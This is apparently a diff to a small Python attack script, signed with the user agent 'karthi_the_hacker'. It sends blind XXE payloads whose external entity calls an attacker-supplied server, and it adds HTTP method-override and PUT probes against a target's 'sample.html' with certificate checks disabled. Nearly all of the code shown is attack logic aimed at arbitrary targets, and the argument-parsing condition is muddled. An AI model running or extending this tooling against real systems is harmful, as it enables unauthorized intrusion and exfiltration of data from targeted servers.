@@ -39,13 +39,31 @@ def psend():
 	print(x.headers) 
 	print(x.text)
 	print(x.links)
-	print("\n <----------------------------------------------------------------------------------> \n")
+	print("\n <-----------------------------------xxe scan-----------------------------------------------> \n")
+	i = requests.post(url + "sample.html" , headers=type , proxies=proxies, verify=False)
+	print("> " + i.url + "  <---url") 
+	print(i.request)
+	print(i)
+	print(i.headers) 
+	print(i.text)
+	print(i.links)
+	print("\n <---------------------------------METHOD scan-------------------------------------------------> \n")
+	r = requests.put(url + "sample.html", proxies=proxies , verify=False )
+	print("> " + r.url + "  <---url") 
+	print(r.request)
+	print(r)
+	print(r.headers) 
+	print(r.text)
+	print(r.links)
+	print("\n <---------------------------------METHOD scan-------------------------------------------------> \n")
+	
 
 def send():
 	#getting CLI arg
 	url = sys.argv[4]
 	server = sys.argv[2]
 	header = {'Content-Type': 'test/xml'}
+	type = {'X-HTTP-Method-Override':'PUT'}
 	agent = {'User-Agent': 'karthi_the_hacker'}
 	entity = '<?xml version=\"1.0\" ?>\r\n<!DOCTYPE xxeElement [\r\n<!ELEMENT xxeElement ANY >\r\n<!ENTITY % emails SYSTEM \"'
 	entity += server + '\">'
@@ -58,8 +76,24 @@ def send():
 	print(x.headers) 
 	print(x.text)
 	print(x.links)
-	print("\n <----------------------------------------------------------------------------------> \n")
-
+	print("\n <---------------------------------xxe scan-------------------------------------------------> \n")
+	i = requests.post(url + "sample.html", headers=type , verify=False)
+	print("> " + i.url + "  <---url") 
+	print(i.request)
+	print(i)
+	print(i.headers) 
+	print(i.text)
+	print(i.links)
+	print("\n <---------------------------------METHOD scan-------------------------------------------------> \n")
+	r = requests.put(url + "sample.html")
+	print("> " + r.url + "  <---url") 
+	print(r.request)
+	print(r)
+	print(r.headers) 
+	print(r.text)
+	print(r.links)
+	print("\n <---------------------------------METHOD scan-------------------------------------------------> \n")
+	
 
 def helpl():
 	banner()
@@ -85,3 +119,9 @@ elif (len(sys.argv) == 5 and str(sys.argv[1]) == "-u" or str(sys.argv[1]) == "--
 elif (len(sys.argv) == 6 and str(sys.argv[1]) == "-u" or str(sys.argv[1]) == "--url" and str(sys.argv[3]) == "-p" or str(sys.argv[3]) == "--proxy" and str(sys.argv[4]) == "-t" or str(sys.argv[4]) == "--target"):
 	print ("proxy")
 	psend()
+
+
+
+
+
+
